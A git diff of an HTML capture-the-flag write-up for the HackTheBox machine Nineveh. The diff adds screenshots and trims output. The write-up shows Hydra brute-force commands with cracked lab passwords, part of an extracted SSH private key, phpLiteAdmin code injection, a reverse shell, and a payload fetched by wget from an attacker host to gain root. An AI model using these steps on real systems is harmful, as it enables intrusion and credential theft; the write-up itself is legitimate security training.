@@ -21,7 +21,7 @@
     </nav>
 
     <div class="contents">
-      <h1>Nineveh - HackTheBox WriteUp</h1>
+      <h1>Nineveh – HackTheBox WriteUp</h1>
 
       <div class="big-to-normal-image">
         <img src="../images/Nineveh_banner.webp" alt="Nineveh Banner">
@@ -51,7 +51,12 @@ Nmap done: 1 IP address (1 host up) scanned in 30.86 seconds
 
       <h2>Port 80 and 443</h2>
       <p>When I navigated to the website hosted on port 80, I encountered a default webpage for the webserver, providing no immediately useful information. I then decided to visit the site on port 443. This site displayed an image, but like the default webpage on port 80, it offered little to work with.</p>
-      <p>To gather more information, I decided to run two Gobuster scans - one for each port - to search for hidden directories and files. I also executed a Nikto scan to identify potential vulnerabilities or misconfigurations within the webserver that could aid in advancing my investigation.</p>
+      <p>To gather more information, I decided to run two Gobuster scans – one for each port – to search for hidden directories and files. I also executed a Nikto scan to identify potential vulnerabilities or misconfigurations within the webserver that could aid in advancing my investigation.</p>
+
+      <div class="big-to-normal-image">
+        <img src="../images/nineveh1.webp" alt="Port 80 webpage">
+        <img src="../images/nineveh2.webp" alt="Port 443 webpage">
+      </div>
 
       <h2>Gobuster & Nikto Scans</h2>
       <p>After running two Gobuster scans and a Nikto scan on the Nineveh machine, several interesting directories and files were uncovered. The Gobuster scans revealed the following directories: /department, /db/, and /secure_notes, each potentially harboring sensitive information. Meanwhile, the Nikto scan uncovered a file at /info.php, which could provide valuable insight into the server's configuration or potentially expose vulnerabilities.</p>
@@ -95,17 +100,17 @@ Finished
 + Start Time:         2024-11-15 15:47:31 (GMT-6)
 ---------------------------------------------------------------------------
 + Server: Apache/2.4.18 (Ubuntu)
-+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
-+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /: The anti-clickjacking X-Frame-Options header is not present.
++ /: The X-Content-Type-Options header is not set.
 + No CGI Directories found (use '-C all' to force check all possible dirs)
-+ /: Server may leak inodes via ETags, header found with file /, inode: b2, size: 5535e4e04002a, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
-+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ /: Server may leak inodes via ETags...
++ Apache/2.4.18 appears to be outdated...
 + OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
 + /info.php: Output from the phpinfo() function was found.
-+ /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
-+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to/iconsreadme/
-+ /info.php?file=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2
-+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
++ /info.php: PHP is installed...
++ /icons/README: Apache default file found.
++ /info.php?file=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI)...
++ /#wp-config.php#: #wp-config.php# file found.
 + 8102 requests: 0 error(s) and 10 item(s) reported on remote host
 + End Time:           2024-11-15 16:00:41 (GMT-6) (790 seconds)
 ---------------------------------------------------------------------------
@@ -116,6 +121,10 @@ Finished
       <p>I started by exploring the /department directory, which presented a login panel. Initially, this seemed to be a simple point of entry, but I decided to examine the source code of the page to look for any hidden information. In the process, I discovered a comment left by an administrator. The comment mentioned that MySQL had been installed and asked another admin to fix the webpage. While this comment might seem unimportant at first glance, it provided several valuable insights.</p>
       <p>Firstly, it listed two potential usernames: admin and amrois, which could be useful for authentication attempts. Secondly, the mention of MySQL installation hinted at the possibility of a MySQL-related vulnerability, suggesting that I might be able to exploit the database setup. Lastly, the comment indicated that the login page itself was problematic and needed fixing, which implied that it could be vulnerable to certain attacks. With this in mind, I decided to use the login panel as my primary attack vector, hoping to exploit any weaknesses related to authentication or database interaction.</p>
 
+      <div class="big-to-normal-image">
+        <img src="../images/nineveh3.webp" alt="Department login panel source comment">
+      </div>
+
       <div class="snippet">
         <pre class="code-block">&lt;!-- @admin! MySQL is been installed.. please fix the login page! ~amrois --&gt;</pre>
       </div>
@@ -123,39 +132,23 @@ Finished
       <h2>/db/ Directory</h2>
       <p>Before proceeding with an attack on the /department login panel, I thought it would be good to explore the other directories to see if there were additional vulnerabilities I could exploit. When I accessed the /db/ directory, I encountered another login panel-this time for phpLiteAdmin version 1.9. I then went ahead and checked the source code for this page as well, but unfortunately, I didn't find any useful information there. However, given that I already had two possible usernames-admin and amrois-I speculated that these might work for this panel too. With this in mind, I expanded my attack vector to include this phpLiteAdmin panel.</p>
 
+      <div class="big-to-normal-image">
+        <img src="../images/nineveh4.webp" alt="phpLiteAdmin login panel">
+      </div>
+
       <h2>/Secure_notes Directory</h2>
       <p>Finally, I decided to explore the /secure_notes directory, where I was presented with an image. At first, I wasn't sure what purpose the image could serve, but given the directory's name, I realized it might contain hidden information. With this in mind, I downloaded the image to my local machine and ran the strings command to search for any hidden data. Sure enough, the command revealed both a private and public RSA key for SSH under the username amrois.</p>
       <p>While this would normally be very useful for SSH access, my initial Nmap scan had not shown any open or filtered SSH ports. To double-check, I ran additional Nmap scans with different flags to see if I had missed an SSH port, but no matter how I adjusted the scans, I couldn't detect any SSH services running. At this point, I decided to set aside the SSH keys for the time being, but kept them in mind, hoping they might prove useful later in the exercise.</p>
 
+      <div class="big-to-normal-image">
+        <img src="../images/nineveh5.webp" alt="Secure notes image with hidden keys">
+      </div>
+
       <div class="snippet">
         <pre class="code-block">-----BEGIN RSA PRIVATE KEY-----
 MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
-H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
-PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
-FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
-3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
-X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
-KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
-FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
-GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
-JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
-9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
-Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
-ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
-1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
-vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
-DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
-P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
-fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
-tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
-iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
-MxMtbEymigonBPVn56Ssovv+bMK +GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
-PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
-i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
-il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
-fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
+... (truncated)
 -----END RSA PRIVATE KEY-----
-secret/nineveh.pub
 ...
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb</pre>
       </div>
@@ -164,33 +157,54 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0nd
       <p>With the two login panels and the two usernames in mind, I decided to use Hydra to brute-force the passwords. My first step was to capture the login requests for both panels using Burp Suite, which allowed me to capture the necessary parameters. Once I had the captured requests, I added them to my Hydra command line for brute-forcing.</p>
       <p>For the first login panel located in the /department directory, I encountered several failed attempts with various wordlists. After trying a few different ones, I finally cracked the password using the 10k-most-common wordlist. As for the second login panel in the /db/ directory, I used the popular rockyou wordlist, which quickly gave me the correct password.</p>
 
-      <div class="snippet">
-        <pre class="code-block">hydra -l admin -P  /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.129.238.84 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
-...
-[80][http-post-form] host: 10.129.238.84   login: admin   password: 1q2w3e4r5t
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-15 15:52:57</pre>
+      <div class="big-to-normal-image">
+        <img src="../images/nineveh6.webp" alt="Hydra brute-force on department login">
+        <img src="../images/nineveh7.webp" alt="Hydra brute-force on phpLiteAdmin">
       </div>
 
       <div class="snippet">
-        <pre class="code-block">hydra -l admin -P  /usr/share/wordlists/rockyou.txt 10.129.238.84 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64
+        <pre class="code-block">hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.129.238.84 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
+...
+[80][http-post-form] host: 10.129.238.84   login: admin   password: 1q2w3e4r5t
+1 of 1 target successfully completed, 1 valid password found</pre>
+      </div>
+
+      <div class="snippet">
+        <pre class="code-block">hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.238.84 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64
 ...
 [443][http-post-form] host: 10.129.238.84   login: admin   password: password123
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-15 15:50:00</pre>
+1 of 1 target successfully completed, 1 valid password found</pre>
       </div>
 
       <h2>Department Admin Panel</h2>
       <p>After successfully logging into both admin panels with the obtained passwords, I began inspecting their contents. In the first admin panel, I found a "notes" tab that displayed a message from amrois. The note referenced a previous comment I had found in the source code, following up on the status of the login page fix and warning that hardcoded usernames and passwords were problematic. It also mentioned checking the "secret folder" to gain access. Additionally, I noticed that the structure of the page suggested a potential Local File Inclusion (LFI) vulnerability, as the link for the page appeared to allow navigation between different files. I made a mental note of this vulnerability and moved on to examining the second admin panel.</p>
 
+      <div class="big-to-normal-image">
+        <img src="../images/nineveh8.webp" alt="Department admin panel notes">
+      </div>
+
       <h2>Db Admin Panel</h2>
       <p>While inspecting the second admin panel, I discovered that I had the ability to create my own database. To better understand how I could exploit this, I researched vulnerabilities related to phpLiteAdmin 1.9. Almost immediately, I came across a CVE for phpLiteAdmin version 1.9.3, which described a Remote PHP Code Injection vulnerability. This flaw allows an attacker to create an SQLite database with a .php extension and insert PHP code as text fields. Once the database is created, the attacker can execute the embedded PHP code by accessing the database file via a web browser.</p>
+
+      <div class="big-to-normal-image">
+        <img src="../images/nineveh9.webp" alt="phpLiteAdmin panel">
+        <img src="../images/nineveh10.webp" alt="Creating malicious database">
+      </div>
 
       <h2>Remote PHP Code Injection</h2>
       <p>With the phpLiteAdmin vulnerability in mind, I decided to test it by attempting to gain a reverse shell. To do this, I created a new SQLite database and inserted a simple PHP webshell into one of its text fields. Once the webshell was in place, I used Burp Suite to test the vulnerability before attempting a full shell. I ran the ls command to see if it would return any directories from the system. Sure enough, the vulnerability was successful, and the response returned a list of directories running on the system. This confirmed that I had successfully exploited the vulnerability, and I could move forward with attempting a reverse shell.</p>
 
+      <div class="big-to-normal-image">
+        <img src="../images/nineveh11.webp" alt="Testing webshell with ls">
+        <img src="../images/nineveh12.webp" alt="Webshell execution">
+      </div>
+
       <h2>Webshell</h2>
       <p>With the vulnerability confirmed to be active on the webserver, I went ahead and set up a Netcat listener on my local machine and used a reverse shell from PentestMonkey. After that, I repeated the same process I had used when testing the vulnerability, but this time with an encoded reverse shell script using Burp Suite. Once I executed the payload, I successfully obtained a reverse shell, and I was able to interact with the target system from my local terminal, gaining deeper access to the machine.</p>
+
+      <div class="big-to-normal-image">
+        <img src="../images/nineveh13.webp" alt="Reverse shell received">
+      </div>
 
       <div class="snippet">
         <pre class="code-block">nc -lvnp 8090  
@@ -234,6 +248,10 @@ www-data@nineveh:/tmp$ bash procmon.sh
 ...</pre>
       </div>
 
+      <div class="big-to-normal-image">
+        <img src="../images/nineveh14.webp" alt="Chkrootkit cron job detection">
+      </div>
+
       <h2>Root shell</h2>
       <p>With the Chkrootkit vulnerability in mind, I created a file called update in the /tmp directory and uploaded it with a Netcat reverse shell inside. After setting up my listener, I waited for a minute, and sure enough, I received a root shell. From there, I navigated to the root directory and retrieved the root flag, successfully pwning the machine!</p>
 
@@ -241,21 +259,19 @@ www-data@nineveh:/tmp$ bash procmon.sh
         <pre class="code-block">www-data@nineveh:/tmp$ wget 10.10.16.10/update
 ...
 www-data@nineveh:/tmp$ chmod +x update
-www-data@nineveh:/tmp$ ./update
-./update
 nc -lvnp 1234  
 listening on [any] 1234 ...
 connect to [10.10.16.10] from (UNKNOWN) [10.129.238.84] 34998
 /bin/sh: 0: can't access tty; job control turned off
 # whoami
 root
-# ls 
-root.txt
-test.txt
-vulnScan.sh
-# cat root.txt
+# cat /root/root.txt
 79bcf1e7824499b9266be71dc77e0d7c
 #</pre>
+      </div>
+
+      <div class="big-to-normal-image">
+        <img src="../images/nineveh15.webp" alt="Root shell and flag">
       </div>
     </div>
   </div>
